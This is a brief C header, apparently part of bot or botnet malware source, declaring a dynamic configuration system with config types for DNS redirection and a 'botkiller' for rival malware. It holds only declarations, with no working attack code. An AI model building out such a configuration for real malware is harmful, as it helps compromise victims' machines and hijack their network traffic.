#pragma once
#include "../common/bot_structs.h"

enum ConfigType
{
	DNS_REDIRECT = 1,
	BOTKILLER = 2
};

typedef struct  
{
	int iConfigType;
	LPSTR pszArguments;
}config_t;

void InitDynamicConfig(void);
void UpdateDynamicConfig(const LPSTR pszConfig);
config_t* GetConfigsByType(int iConfigType, PDWORD pdwCount);
void LoadDynamicConfig(void);